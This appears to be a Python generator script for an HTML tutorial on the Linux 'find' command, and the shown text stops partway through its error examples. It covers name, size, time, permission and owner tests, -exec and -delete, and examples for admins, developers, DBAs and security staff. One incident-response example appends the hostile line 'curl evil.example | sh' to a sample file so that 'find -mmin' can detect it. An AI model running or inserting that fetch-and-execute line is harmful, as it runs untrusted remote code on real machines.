import os, sys
HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(HERE, '..', '..'))
from linuxkit import *

# A small project tree used by every example (created silently).
TREE = r"""mkdir -p proj/src/app proj/src/tests proj/logs proj/tmp/cache proj/empty_dir proj/backup
printf 'print(1)\n' > proj/src/app/main.py; printf 'x=1\n' > proj/src/app/Utils.PY; printf 'def test(): pass\n' > proj/src/tests/test_main.py
printf 'class Main {}\n' > proj/src/app/Main.java; : > proj/src/app/empty.txt; printf 'DB_PASSWORD=x\n' > proj/src/app/.env
head -c 3M /dev/zero > proj/logs/app.log; head -c 200K /dev/zero > proj/logs/access.log; printf 'ok\n' > proj/logs/cron.log
head -c 50K /dev/zero > proj/tmp/cache/a.tmp; head -c 20K /dev/zero > proj/tmp/b.tmp
head -c 1M /dev/zero > proj/backup/db_2026-10-01.sql.gz; head -c 1M /dev/zero > proj/backup/db_2026-11-05.sql.gz
touch -d '2026-10-01 02:00' proj/backup/db_2026-10-01.sql.gz proj/tmp/b.tmp; touch -d '2026-09-20' proj/logs/cron.log
touch -d '2026-11-05 02:00' proj/backup/db_2026-11-05.sql.gz
chmod 777 proj/src/app/main.py; chmod 600 proj/src/app/.env; chmod 755 proj/src/app/Utils.PY"""

HOOK = hook('Saturday morning, the server’s disk is 97% full and the website is about to stop. Somewhere under /var are log files that grew to gigabytes, backups older than anyone needs, and temporary files nobody cleaned. <code>ls</code> shows one folder at a time; <code>grep</code> looks inside files. To find the <b>files themselves</b> by name, size, age, owner or permission, anywhere in a folder tree, and act on them, Linux has <code>find</code>: <code>find /var/log -name \'*.log\' -size +100M -mtime +30</code>.',
    ['search a folder tree by name (<code>-name -iname -path -regex</code>) and by type (<code>-type f d l</code>)',
     'find files by size (<code>-size +100M</code>), age (<code>-mtime -mmin -newer</code>), permissions (<code>-perm</code>) and owner (<code>-user -group -nouser</code>)',
     'combine tests with AND, OR, NOT and brackets, limit depth, and skip folders with <code>-prune</code>',
     'act on what you found safely: <code>-print</code>, <code>-ls</code>, <code>-printf</code>, <code>-exec … {} \\;</code> and <code>+</code>, <code>-ok</code>, <code>-delete</code>, <code>-print0 | xargs -0</code>'])
ROAD = roadmap([
    ('story', 'The story', 3, 'the disk at 97%'),
    ('decide', 'Which test when?', 2, 'the quick chart'),
    ('definition', 'What find is', 5, 'simple meaning + 4 depths'),
    ('commands', 'find, by field', 18, 'tests, actions, your field'),
    ('errors', 'Errors decoded', 3, 'what each message means'),
    ('animation', 'See it happen', 4, 'find walking the tree'),
    ('run', 'Run the code', 4, 'try it in the browser'),
    ('lab', 'Practice lab', 6, 'do it yourself, auto-checked'),
], short=['story', 'decide', 'commands', 'lab'])
DECIDE = decide('Which find test? (decide in 5 seconds)', [
    ('By name (case matters)', "find . -name '*.log'", 'always quote the pattern'),
    ('By name, any case', "find . -iname '*.py'", 'main.py and MAIN.PY'),
    ('Only files / only folders', 'find . -type f  ·  -type d', 'l = symbolic links'),
    ('Bigger than 100 MB', 'find / -size +100M', '-size -10k = smaller'),
    ('Changed in the last 7 days', 'find . -mtime -7', '+30 = older than 30 days'),
    ('Changed in the last 15 minutes', 'find . -mmin -15', 'what did that install change?'),
    ('Newer than a reference file', 'find . -newer stamp.txt', 'since the last backup'),
    ('Dangerous permissions', 'find / -perm -0002 -type f', 'world-writable files'),
    ('Owned by a user / no owner', 'find /home -user riya  ·  -nouser', 'after deleting a user'),
    ('Empty files or folders', 'find . -empty', 'clean-up'),
    ('Do something with each result', "find … -exec cmd {} +", '-delete to remove'),
    ('Do not go deeper than N levels', 'find . -maxdepth 2', 'put it first'),
])

cmap = concept_map(
    [('2.3', 'Paths', 'absolute and relative paths'), ('3.4', 'Wildcards', '* ? [ ] (quote them for find)'), ('5.4', 'xargs', 'turn results into arguments')],
    ['find PATH TESTS ACTIONS: walking a folder tree', 'tests: -name -iname -path -regex -type -size -empty', 'time: -mtime -mmin -atime -newer; permissions and owners: -perm -user -nouser', 'operators: ! -o ( ) -maxdepth -prune', 'actions: -print -ls -printf -exec {} \\; / + -ok -delete -print0'],
    [('7.2', 'locate, which, whereis', 'faster ways for some searches'), ('13.2', 'find + xargs + -exec', 'bulk changes across files'), ('15.4', 'df and du', 'what is using the disk'), ('9.4', 'SUID files', 'find -perm -4000 in audits')],
    'grep finds text inside files; find finds the files themselves. Together with xargs they are how admins clean, audit and change thousands of files at once.')

# ---------------------------------------------------------------- 1. story
sc = (term(20, 14, 316, 156, ["$ sudo find /var -type f -size +100M", ('/var/log/app/app.log', 'err'), ('/var/backups/db_2026-10-01.sql.gz', 'err'), "$ sudo find /var/backups -name '*.gz' -mtime +30", ('/var/backups/db_2026-10-01.sql.gz', 'out'), "$ sudo find /tmp -type f -mtime +7 -delete", ('$ df -h /  →  61% used', 'acc')], title='riya@web01: ~', size=6.8, step=15)
      + t(352, 36, 'Find files by:', 9.4, 'acc', anchor='start', bold=True)
      + ''.join(t(352, 58 + k * 17, s, 8.8, 'ink2', anchor='start') for k, s in enumerate(['• name  -name', '• size  -size +100M', '• age   -mtime +30', '• owner, permission', '• then act: -exec, -delete'])))
story = '''<section class="part" id="story">
  <span class="part-label"><b>1</b> The story</span>
  <h2>The disk at 97%</h2>
  <div class="story">
''' + puzzle('Riya is inside <code>src/</code>, which contains <code>app.py</code>. She runs <code>find .. -name *.py</code> (no quotes) to find every Python file in the project, including <code>tests/test_main.py</code>. Only one file is printed. Why? And why does <code>find . -size -1k</code> not list a 2-byte file?') + '''
    <p class="narration">The monitoring alert says “/ is 97% full”. Riya has ten minutes before the database stops writing.</p>
''' + scene('A terminal: find -size +100M lists a huge log and an old backup; find -mtime +30 lists the old backup; find /tmp -mtime +7 -delete removes old temporary files; df now shows 61% used.', sc,
            'find answers “<tspan font-weight="700" class="s-acc">which files</tspan>?”, by any property.') + '''
A> Don’t guess. Ask: which files under /var are bigger than 100 MB? find walks every folder below the starting point and tests each file.
R> And then delete the old ones?
K> Carefully: first list them, then the same command with <code>-delete</code> or <code>-exec</code>. Never the other way round.
A> Today: find’s tests (name, type, size, time, permission, owner), how to combine them, and its actions, each explained, then used by admins, developers, DBAs, DevOps, security and testers.
  </div>
</section>
'''

# ---------------------------------------------------------------- 2. definition
pic = ('<div class="scene"><svg viewBox="0 0 640 210" role="img" aria-label="A librarian walking every aisle and shelf of a library, checking each book against a list of rules (title, thickness, date) and putting the matching books on a trolley.">'
       + label_box(14, 20, 200, 130, ['library (folder tree)', 'aisle /var', '  shelf log/', '  shelf backups/', 'aisle /home …'], 'card', 8.6)
       + label_box(240, 30, 170, 110, ['librarian checks', 'each book:', 'title ends .log?', 'thicker than 100M?', 'older than 30 days?'], 'amber', 8.4)
       + label_box(440, 50, 186, 70, ['trolley (results)', 'then: print, copy,', 'compress or delete'], 'green', 8.4)
       + arrow(216, 85, 236, 85) + arrow(412, 85, 436, 85)
       + t(320, 186, 'find visits every shelf below the starting point and checks every book.', 9.6, 'acc', bold=True)
       + '<text x="632" y="204" text-anchor="end" class="s-wm">myphatshala.in</text></svg></div>')
lv = levels4('find at four depths', [
    ('v', 'No jargon: a librarian with a checklist', '      <p>Think of a librarian looking for books.</p>' + pic + '''
      <ul>
        <li>The librarian starts at one aisle (the folder you give) and walks every shelf below it.</li>
        <li>Each book is checked against your rules: title, thickness, date, owner.</li>
        <li>Matching books go on a trolley; then you decide what to do with them.</li>
      </ul>'''),
    ('b', 'The forms you will type every day', '''      <ul>
        <li><code>find . -name 'notes.txt'</code>: find a file by exact name under the current folder.</li>
        <li><code>find ~ -name '*.pdf'</code>: all PDFs in your home folder (quote the *).</li>
        <li><code>find . -type d</code>: only folders; <code>-type f</code> only files.</li>
        <li><code>find /var/log -size +100M</code>: big files.</li>
        <li><code>find . -mtime -1</code>: changed in the last 24 hours.</li>
      </ul>'''),
    ('i', 'Tests, units and combining', '''      <ul>
        <li>Numbers take a sign: <code>+N</code> more than, <code>-N</code> less than, <code>N</code> exactly. <code>-mtime +30</code> = more than 30 days ago.</li>
        <li>Sizes: <code>c</code> bytes, <code>k</code> KiB, <code>M</code> MiB, <code>G</code> GiB. find <b>rounds up</b> to whole units, so <code>-size -1k</code> means “0 KiB”: only empty files.</li>
        <li>Tests are joined by AND automatically; <code>-o</code> is OR, <code>!</code> is NOT, <code>\\( … \\)</code> groups: <code>find . \\( -name '*.log' -o -name '*.tmp' \\) -mtime +7</code>.</li>
        <li><code>-maxdepth N</code> limits how deep find goes; <code>-path ./node_modules -prune -o … -print</code> skips a folder entirely.</li>
        <li>Actions: <code>-exec cmd {} \\;</code> runs once per file, <code>-exec cmd {} +</code> once for many files (faster), <code>-ok</code> asks first, <code>-delete</code> removes.</li>
      </ul>'''),
    ('a', 'Behind the screen: walking the tree', '''      <ul>
        <li>find reads folders with <code>getdents64</code> and checks each entry with <code>newfstatat</code> (size, times, owner, mode). It does not open or read the files, so it is fast even on millions of files, but it must visit every folder: no index (that is locate’s job, Lesson 7.2).</li>
        <li>Tests run left to right and stop at the first false one: put cheap tests (<code>-name</code>, <code>-type</code>) before expensive ones (<code>-exec</code>).</li>
        <li>Times: <code>-mtime</code> content modified, <code>-ctime</code> inode changed (permissions, owner, rename), <code>-atime</code> last read (often disabled by <code>relatime</code> mounts). Days are counted in whole 24-hour periods, so <code>-mtime +1</code> means at least 48 hours ago.</li>
        <li><code>-delete</code> implies <code>-depth</code> (contents before their folder). <code>-xdev</code> stays on one file system (do not wander into /proc or network mounts).</li>
        <li>Parsing find output is safe only with <code>-print0</code> + <code>xargs -0</code> or <code>-exec … +</code>: file names may contain spaces and even newlines.</li>
      </ul>'''),
])
definition = '''<section class="part" id="definition">
  <span class="part-label"><b>2</b> Definition</span>
  <h2>find: search by name, type, size, time and run -exec</h2>
''' + def_block(
    '<code>find</code> walks a directory tree starting at one or more paths and evaluates an <b>expression</b> for every file and folder it meets. The expression is made of <b>tests</b> (name, type, size, times, permissions, owner…), <b>operators</b> (and, or, not, grouping) and <b>actions</b> (print, list, run a command, delete). The default action is <code>-print</code>.',
    'Walk the folders, test every file, act on the ones that match.') + '''

  <h3>Words you’ll meet in this lesson</h3>
''' + terms([
    ('Starting point', 'The folder(s) find searches below: . ~ /var/log'),
    ('Test', 'A condition: -name, -size, -mtime …'),
    ('Action', 'What to do with a match: -print, -exec, -delete …'),
    ('mtime / ctime / atime', 'Content modified / inode changed / last accessed.'),
    ('Glob', f'The * ? [ ] pattern used by -name. {gl("globbing-wildcards", "Glossary →")}'),
    ('{}', 'In -exec: replaced by the current file name.'),
    ('-prune', 'Do not descend into this folder.'),
    ('xargs', f'Builds command lines from find’s output. {gl("xargs", "Glossary →")}'),
]) + '\n' + names('Where the names come from.', [
    ('find', 'find', 'In Unix since Version 5 (1974).'),
    ('-name / -iname', 'name / case-insensitive name', ''),
    ('-mtime', 'modification time (days)', '-mmin = minutes.'),
    ('-exec … \\;', 'execute', 'The ; ends the command; \\ protects it from the shell.'),
    ('{}', 'placeholder', 'The current path.'),
    ('-ok', 'ask “ok?” before each', 'Interactive -exec.'),
    ('-prune', 'cut a branch', 'Like pruning a tree.'),
    ('-xdev', 'cross device: no', 'Stay on one file system.'),
]) + '''

  <h3>Quick facts</h3>
''' + facts([
    ('By name', "<code>find . -name '*.log'</code>"),
    ('Big files', '<code>find / -xdev -size +100M</code>'),
    ('Old files', '<code>find . -mtime +30</code>'),
    ('Folders only', '<code>find . -type d</code>'),
    ('Run a command', "<code>find . -name '*.tmp' -exec rm {} +</code>"),
    ('Safe with xargs', '<code>find … -print0 | xargs -0 …</code>'),
]) + '\n' + lv + didyou('find never opens your files to search them: it only looks at their names and the information the file system keeps about them (the <b>inode</b>: size, owner, permissions, times, Lesson 10.1). That is why <code>find / -size +1G</code> can scan a whole server in seconds, while <code>grep -r</code> on the same server would read every byte.') + '''
EXAM> “Find all files larger than 100 MB under /var that have not been modified for 30 days, and list them with their sizes.” → find /var -type f -size +100M -mtime +30 -exec ls -lh {} + (explain + and - in -size and -mtime, and -exec … +).
''' + qc('What is the difference between <code>find . -mtime -7</code> and <code>find . -mtime +7</code>?', '-7: modified less than 7 days ago (recent). +7: modified more than 7 days ago (old).') + '''
</section>
'''

# ---------------------------------------------------------------- 3. types
types = '''<section class="part" id="types">
  <span class="part-label"><b>3</b> Types and ways to use it</span>
  <h2>find’s tests, actions and operators</h2>
''' + table(['Test', 'Matches', 'Example'], [
    ['<code>-name / -iname</code>', 'file name (glob), case / any case', "<code>-name '*.log'</code>"],
    ['<code>-path / -ipath</code>', 'the whole path (glob)', "<code>-path '*/tests/*'</code>"],
    ['<code>-regex</code>', 'the whole path (regex)', "<code>-regex '.*\\.\\(py\\|sh\\)'</code>"],
    ['<code>-type f d l</code>', 'file, directory, symlink', '<code>-type d</code>'],
    ['<code>-size +100M</code>', 'size (c k M G; rounded up)', '<code>-size +1G</code>'],
    ['<code>-empty</code>', 'empty file or folder', '<code>-type d -empty</code>'],
    ['<code>-mtime / -mmin</code>', 'content changed N days / minutes ago', '<code>-mtime +30</code>'],
    ['<code>-atime / -ctime</code>', 'read / inode changed', '<code>-ctime -1</code>'],
    ['<code>-newer FILE</code>', 'modified after FILE', '<code>-newer last_backup</code>'],
    ['<code>-perm 644 / -644 / /222</code>', 'exactly / all of / any of these bits', '<code>-perm -4000</code> SUID'],
    ['<code>-user / -group / -nouser</code>', 'owner / group / owner deleted', '<code>-user riya</code>'],
    ['<code>-maxdepth / -mindepth N</code>', 'how deep to go', '<code>-maxdepth 1</code>'],
], minw=620) + table(['Action / operator', 'Does', 'Example'], [
    ['<code>-print</code> (default)', 'print the path', ''],
    ['<code>-ls</code> / <code>-printf</code>', 'long listing / custom format', "<code>-printf '%s %p\\n'</code>"],
    ['<code>-exec cmd {} \\;</code>', 'run cmd once per file', "<code>-exec chmod 640 {} \\;</code>"],
    ['<code>-exec cmd {} +</code>', 'run cmd once with many files (fast)', '<code>-exec ls -lh {} +</code>'],
    ['<code>-ok cmd {} \\;</code>', 'ask before each', 'careful deletes'],
    ['<code>-delete</code>', 'remove matches', 'list first!'],
    ['<code>-print0</code>', 'NUL-separated for xargs -0', '<code>| xargs -0 …</code>'],
    ['<code>!</code> <code>-o</code> <code>\\( \\)</code>', 'not, or, grouping', "<code>\\( -name a -o -name b \\)</code>"],
    ['<code>-prune</code>', 'skip a folder', "<code>-path ./.git -prune -o -print</code>"],
], minw=620) + mistake("find /home -type f -perm -777   (described as “files with 777 permissions”)", "find /home -type f -perm 0777   (exactly 777)   ·   -perm -777 = at least all of rwxrwxrwx   ·   -perm /o+w = world-writable",
    'Notes often mix -perm 777 and -perm -777. Without a sign the mode must match exactly; with - every listed bit must be set; with / any of them. For “exactly 777” both give the same files, but for -644 vs 644 the results differ.') + '''
  <h3>find, locate, grep and ls: which one?</h3>
''' + table(['', '<code>find</code>', '<code>locate</code> (7.2)', '<code>grep -r</code> (6.1)', '<code>ls</code>'], [
    ['Looks at', 'names + file data (size, time, owner)', 'names in an index', 'text inside files', 'one folder'],
    ['Speed on a big disk', 'seconds to minutes', 'instant', 'slow (reads every byte)', 'instant'],
    ['Up to date?', 'yes, live', 'no: as of the last updatedb', 'yes', 'yes'],
    ['Size / age / owner tests', '<b>yes</b>', 'no', 'no', 'only for display'],
    ['Can act on results', '<b>-exec, -delete</b>', 'via xargs', 'no', 'no'],
    ['Use it for', 'clean-up, audits, bulk changes', '“where is that file?”', '“which file says this?”', 'looking around'],
], minw=640) + qc('Which command lists only folders, at most 2 levels deep?', '<code>find . -maxdepth 2 -type d</code>') + '''
</section>
'''

# ---------------------------------------------------------------- 4. commands
cards = '''<section class="part" id="steps">
  <span class="part-label"><b>4</b> Step by step</span>
  <h2>find explained, then used in every field</h2>
  <p id="commands">All outputs were recorded on Ubuntu 24.04 (GNU findutils 4.9) as a normal user on a small sample project <code>proj/</code> (source code, logs, temporary files, backups). Searches of system folders show real “Permission denied” messages where a normal user cannot look.</p>
''' + cmdcard_u(['you know (part of) the name but not the folder', 'all files of a kind: *.log, *.py, *.conf', 'folders only, files only, links only'],
               ['searching text inside files (grep -r, Lesson 6.1)', 'the whole disk when locate is enough (Lesson 7.2)'])(
    'name', 'find -name · -type', 'search by name and type',
    'Walks the tree below each starting point and prints paths whose name matches the glob. <code>-iname</code> ignores case; <code>-type f/d/l</code> restricts the kind.',
    "find PATH... [-name 'GLOB' | -iname 'GLOB' | -path 'GLOB'] [-type f|d|l]", 'safe',
    [(". / ~ / /var/log", 'where to start', 'current, home, a folder'),
     ("-name 'main.py'", 'exact name', 'one file'),
     ("-name '*.log'", 'pattern (quote it!)', 'all logs'),
     ("-iname '*.py'", 'any case', '.py and .PY'),
     ("-path '*/tests/*'", 'match the folder part too', 'test files'),
     ('-type f / d / l', 'file / directory / symlink', 'kind'),
     ('-maxdepth 1', 'this folder only', 'no recursion')],
    dict(setup=TREE, cmd="find proj -name '*.py'\necho ---\nfind proj -iname '*.py'\necho ---\nfind proj -maxdepth 1 -type d | sort", note='-iname also found Utils.PY. -maxdepth 1 lists only the first level of folders.'),
    [('sys', [
        dict(situation='Where is the nginx config? (the real command, with errors hidden)', cmd="sudo find / -name 'nginx.conf' -type f 2>/dev/null",
             typical='/etc/nginx/nginx.conf', why='Search from / as root; 2&gt;/dev/null hides “Permission denied” for /proc entries. On a normal Ubuntu, locate nginx.conf is faster (7.2).'),
        dict(situation='As a normal user, searching system folders gives permission errors.', cmd="find /etc -name '*.conf' 2>&1 | grep -c 'Permission denied'\nfind /etc -name '*.conf' 2>/dev/null | wc -l",
             why='Errors go to stderr (Lesson 5.1); the results still come through.', expect='any')]),
     ('dev', [
        dict(situation='All test files in a project, wherever they are.', setup=TREE, cmd="find proj -path '*/tests/*' -name '*.py'",
             why='-path matches the whole path, so the folder name can be part of the pattern.')]),
     ('devops', [
        dict(situation='Hidden files (like .env) that should not be in a deploy package.', setup=TREE, cmd="find proj -name '.*' -type f",
             why='-name \'.*\' matches names starting with a dot. Secrets in .env files must never be shipped.')]),
    ],
    anat=anatomy([('find', 'cmd', 'command'), ('proj', 'arg', 'where to start'), ("-name '*.py'", 'opt', 'test: name (quoted glob)'), ('-type f', 'opt', 'test: regular file'), ('-print', 'opt', 'action (default)')], 'Starting points come first, then tests and actions. Quote every pattern so the shell does not expand it.')
) + mistake("find .. -name *.py   (no quotes)", "find .. -name '*.py'",
            'Without quotes the shell expands *.py in the <b>current</b> folder first. With one file app.py there, find receives -name app.py and finds only that name (real run). With two .py files here it fails with “paths must precede expression”. This is the first part of the puzzle.') + cmdcard_u(['disk full: what is big?', 'very small or empty files that should not exist', 'size limits for uploads, logs, backups'],
               ['totals per folder (use du, Lesson 15.4)'])(
    'size', 'find -size · -empty', 'search by size',
    '<code>-size +N</code> bigger than, <code>-N</code> smaller than, <code>N</code> exactly, with units <code>c</code> (bytes), <code>k</code>, <code>M</code>, <code>G</code>. find rounds each file up to whole units before comparing. <code>-empty</code> matches empty files and folders.',
    'find PATH -size [+|-]N[c|k|M|G]   ·   find PATH -empty', 'safe',
    [('-size +100M', 'more than 100 MiB', 'disk clean-up'),
     ('-size +1G', 'more than 1 GiB', 'huge files'),
     ('-size -10k', 'smaller than 10 KiB (rounded up!)', 'tiny files'),
     ('-size -100c', 'smaller than 100 bytes', 'exact small sizes'),
     ('-empty', 'empty files and folders', 'clean-up'),
     ('-printf "%s %p\\n"', 'print size in bytes and path', 'sort by size')],
    dict(setup=TREE, cmd="find proj -type f -size +1M\necho ---\nfind proj -type f -size -1k\necho ---\nfind proj -empty | sort", note='-size -1k found only the empty file: a 3-byte file is rounded up to 1k, which is not less than 1k (second part of the puzzle). Use -size -1024c for “less than 1024 bytes”.'),
    [('sys', [
        dict(situation='The 3 biggest files in a tree, biggest first.', setup=TREE, cmd="find proj -type f -printf '%s %p\\n' | sort -rn | head -3",
             why='-printf %s prints the size in bytes; sort -rn ranks them. No parsing of ls needed.'),
        dict(situation='Big files on the whole disk, staying on one file system (the real command).', cmd='sudo find / -xdev -type f -size +500M -exec ls -lh {} + 2>/dev/null',
             typical='-rw-r----- 1 syslog adm  2.1G Nov  6 09:59 /var/log/app/app.log\n-rw-r--r-- 1 root   root 812M Oct  1 02:00 /var/backups/db_2026-10-01.sql.gz',
             why='-xdev skips /proc, /sys and other mounts. -exec ls -lh {} + shows human sizes in one ls call.')]),
     ('qa', [
        dict(situation='Exports that came out empty (a failed job leaves 0-byte files).', setup=TREE, cmd="find proj -type f -empty",
             why='An empty export is a classic sign of a silent failure.')]),
    ]
) + cmdcard_u(['what changed recently (after a deploy, an update, an attack)', 'old files for clean-up and retention', 'changes since a reference point (-newer)'],
               ['exact timestamps (use stat or ls --full-time)'])(
    'time', 'find -mtime · -mmin · -newer', 'search by time',
    'Compares file times with now: <code>-mtime</code> in days, <code>-mmin</code> in minutes (content changed), <code>-ctime</code>/<code>-cmin</code> (inode changed), <code>-atime</code>/<code>-amin</code> (last read). <code>+N</code> older than, <code>-N</code> newer than. <code>-newer FILE</code> compares with another file.',
    'find PATH -mtime [+|-]N   ·   -mmin [+|-]N   ·   -newer REF   ·   -newermt "2026-11-01"', 'safe',
    [('-mtime -1', 'changed in the last 24 h', 'today’s changes'),
     ('-mtime +30', 'not changed for 30+ days', 'retention'),
     ('-mmin -15', 'changed in the last 15 minutes', 'what just happened'),
     ('-newer stamp', 'newer than stamp', 'since last run'),
     ('-newermt "2026-11-01"', 'newer than a date (GNU)', 'audits'),
     ('-atime +90', 'not read for 90 days', 'archiving (if atime is kept)')],
    dict(setup=TREE, cmd="find proj -type f -mtime +30 | sort\necho ---\nfind proj -type f -newermt '2026-11-01' -name '*.gz'", note='Old files: the October backup, an old temp file and the September cron log (sample files have fixed dates). -newermt took a date directly.'),
    [('dba', [
        dict(situation='Backups older than 30 days, ready for deletion (list first!).', setup=TREE, cmd="find proj/backup -name 'db_*.sql.gz' -mtime +30",
             why='The usual retention rule. The same command with -delete removes them; run it without first.')]),
     ('sec', [
        dict(situation='What changed in the last 10 minutes? (after a suspicious login)', setup=TREE + "\nfind proj -exec touch -d '2026-11-01' {} +", cmd="echo 'curl evil.example | sh' >> proj/src/app/main.py\nfind proj -type f -mmin -10",
             why='Every sample file was dated 1 Nov; the attacker’s change is the only file touched in the last 10 minutes. Incident responders run the same test on /etc, /usr/bin and web folders.')]),
     ('devops', [
        dict(situation='Only files changed since the last deploy marker.', setup=TREE + "\nfind proj -exec touch -d '2026-10-25' {} +; touch -d '2026-11-03' proj/src/app/main.py proj/logs/app.log", cmd="touch -d '2026-11-01' proj/.last_deploy\nfind proj -type f -newer proj/.last_deploy ! -name '.last_deploy' | sort",
             why='A marker file is the simplest “since last time” for incremental copies.')]),
    ]
) + cmdcard_u(['security audits: world-writable, SUID, wrong owners', 'after deleting a user: files with no owner', 'fixing permissions in bulk (with -exec)'],
               ['changing ownership without checking the list first'])(
    'perm', 'find -perm · -user · -nouser', 'search by permission and owner',
    '<code>-perm MODE</code> exact, <code>-perm -MODE</code> all these bits set, <code>-perm /MODE</code> any of these bits set. <code>-user</code>/<code>-group</code> by owner; <code>-nouser</code>/<code>-nogroup</code> for files whose owner no longer exists.',
    'find PATH -perm [-|/]MODE   ·   -user NAME   ·   -group NAME   ·   -nouser', 'safe',
    [('-perm 0777', 'exactly rwxrwxrwx', 'dangerous files'),
     ('-perm -0002 / /o+w', 'world-writable', 'audits'),
     ('-perm -4000', 'SUID bit set', 'privilege escalation checks'),
     ('-perm /u+x', 'executable by owner', 'scripts'),
     ('-user riya / -group dev', 'owned by', 'per-user clean-up'),
     ('-nouser / -nogroup', 'owner deleted', 'orphans')],
    dict(setup=TREE, cmd="find proj -type f -perm 0777\nfind proj -type f -perm /o+w\nfind proj -type f -perm 600 -name '.*'", note='main.py is 777 (anyone can change it); .env is 600 (owner only), which is correct for secrets.'),
    [('sec', [
        dict(situation='SUID programs on the system (they run with the owner’s rights).', cmd="find /usr/bin -perm -4000 -type f 2>/dev/null | head -5",
             why='Compare with a known list regularly (Lesson 6.3 comm, 9.4). A new SUID file is a red flag.'),
        dict(situation='Fix world-writable files in a project in one go.', setup=TREE, cmd="find proj -type f -perm /o+w -exec chmod o-w {} +\nfind proj -type f -perm /o+w | wc -l",
             why='-exec … + runs chmod once with all files. Afterwards the check finds 0.')]),
     ('sys', [
        dict(situation='Files of a user, e.g. before removing the account (the real command).', cmd='sudo find /home /srv -user olduser -ls 2>/dev/null | head',
             typical='  1835012      4 -rw-r--r--   1 olduser  olduser       92 Oct  2 11:05 /srv/shared/report.txt',
             why='Decide what to archive or re-own before userdel (Lesson 8.2). Afterwards use -nouser to find leftovers.')]),
    ]
) + cmdcard_u(['skipping folders like .git, node_modules, /proc', 'combining several names or conditions', 'limiting depth for speed'],
               ['very complex logic: pipe to grep/awk or write a small script'])(
    'logic', 'find ! -o ( ) -prune', 'combining tests',
    'Tests next to each other are joined by AND. <code>-o</code> means OR, <code>!</code> means NOT, and <code>\\( \\)</code> groups (escaped for the shell). <code>-prune</code> stops find from going into a folder.',
    "find . \\( -name '*.log' -o -name '*.tmp' \\) ! -name 'keep*'   ·   find . -path ./.git -prune -o -type f -print", 'safe',
    [('A B', 'A and B', 'both'),
     ('A -o B', 'A or B', 'several names'),
     ('! A', 'not A', 'exclude'),
     ("\\( A -o B \\) C", 'grouping', '(A or B) and C'),
     ("-path ./x -prune -o … -print", 'skip folder x', '.git, node_modules'),
     ('-maxdepth / -mindepth', 'depth limits', 'speed, levels'),
     ('-xdev', 'one file system only', 'skip /proc, mounts')],
    dict(setup=TREE, cmd="find proj -type f \\( -name '*.log' -o -name '*.tmp' \\) | sort\necho ---\nfind proj -path proj/src -prune -o -type f -print | sort | head -4", note='The brackets make OR apply to the two names only. The second command skipped everything under proj/src.'),
    [('dev', [
        dict(situation='All files except Python and Java sources.', setup=TREE, cmd="find proj/src -type f ! -name '*.py' ! -name '*.java'",
             why='Two NOT tests joined by AND.')]),
     ('devops', [
        dict(situation='Old .log or .tmp files, but never anything in backup/.', setup=TREE, cmd="find proj -path proj/backup -prune -o -type f \\( -name '*.log' -o -name '*.tmp' \\) -mtime +7 -print",
             why='Without the explicit -print the pruned folder name would be printed too; with it, only matches are shown.')]),
    ]
) + mistake("find . -name '*.log' -o -name '*.tmp' -delete", "find . \\( -name '*.log' -o -name '*.tmp' \\) -delete",
            'AND binds tighter than OR, so without brackets -delete belongs only to the second test: the .log files are matched but not deleted (and nothing tells you). Always group OR tests in \\( \\).') + cmdcard_u(['doing something with each result: list, compress, move, change permissions, delete', 'bulk work on thousands of files', 'cleaning up by age or size'],
               ['deleting before you have looked at the list'])(
    'exec', 'find -exec · -ok · -delete · -print0', 'act on the results',
    '<code>-exec cmd {} \\;</code> runs cmd for each file ({} = the path). <code>-exec cmd {} +</code> passes many files to one cmd (faster). <code>-ok</code> asks y/n first. <code>-delete</code> removes. <code>-print0</code> + <code>xargs -0</code> handles any file name.',
    "find … -exec CMD {} \\;   ·   find … -exec CMD {} +   ·   find … -delete   ·   find … -print0 | xargs -0 CMD", 'danger',
    [('-exec ls -lh {} +', 'list matches with sizes', 'review'),
     ('-exec gzip {} \\;', 'compress each', 'logs'),
     ('-exec chmod 640 {} +', 'fix permissions', 'bulk'),
     ('-exec mv {} /archive/ \\;', 'move each', 'archiving'),
     ('-ok rm {} \\;', 'ask before each', 'careful'),
     ('-delete', 'delete matches (implies -depth)', 'clean-up'),
     ('-print0 | xargs -0 -P4', 'parallel, safe names', 'speed')],
    dict(setup=TREE, cmd="find proj/logs -name '*.log' -exec ls -s {} + | sort -n\necho ---\nfind proj -name '*.tmp' -mtime +7\nfind proj -name '*.tmp' -mtime +7 -delete\nfind proj -name '*.tmp' | wc -l", note='First list, then the same tests with -delete, then check: one old .tmp was removed, one recent one remains.'),
    [('sys', [
        dict(situation='Compress logs older than 7 days (log rotation by hand).', setup=TREE, cmd="touch -d '10 days ago' proj/logs/access.log\nfind proj/logs -name '*.log' -mtime +7 -exec gzip -v {} \\; 2>&1\nls proj/logs",
             why='One gzip per file with \\;. logrotate normally does this (Lesson 18.2).')]),
     ('dev', [
        dict(situation='Search for a word only in Python files (find + grep).', setup=TREE, cmd="find proj -name '*.py' -exec grep -l 'print' {} +",
             why='find chooses the files, grep looks inside. (grep -r --include does the same; find adds size/time tests.)')]),
     ('devops', [
        dict(situation='Safe with any file name: count lines of all logs with xargs.', setup=TREE + "\nprintf 'a\\nb\\n' > 'proj/logs/my app.log'", cmd="find proj/logs -name '*.log' -print0 | xargs -0 wc -l | tail -1",
             why='“my app.log” has a space; -print0 / -0 keeps it one name (Lesson 5.4).')]),
     ('qa', [
        dict(situation='Ask before deleting each file (the answer here is given by yes n).', setup=TREE, cmd="yes n | find proj/tmp -name '*.tmp' -ok rm {} \\; 2>&1 | head -2; find proj/tmp -name '*.tmp' | wc -l",
             why='-ok prints “&lt; rm … &gt; ?” and waits for y. Answering n deleted nothing.')]),
    ]
) + undo('find itself only reads; -delete and -exec can destroy data.', [
    ('Before -delete or -exec rm:', 'run the same command without it, read the list, count it with <code>| wc -l</code>.'),
    ('-delete removed too much:', 'there is no undo: restore from backup. Put -delete <b>last</b>; it acts on whatever matched before it.'),
    ('Started at the wrong place (find / …):', 'Ctrl+C stops it at once.'),
    ('A command ran on the wrong files with -exec:', 'use -ok the first time, or echo: <code>-exec echo rm {} +</code> as a dry run.'),
]) + errors('find errors students see most. Each was really produced on our build machine, with its exit status.', [
    dict(cmd='find /root -name x', meaning='A normal user cannot read /root. find reports it and exits 1.', fix='sudo, or 2&gt;/dev/null if you only care about readable places.'),
    dict(cmd="touch a.py b.py; find . -name *.py", meaning='The shell expanded *.py to a.py b.py; find got an extra word where it expected a test.', fix="Quote the pattern: <code>-name '*.py'</code>."),
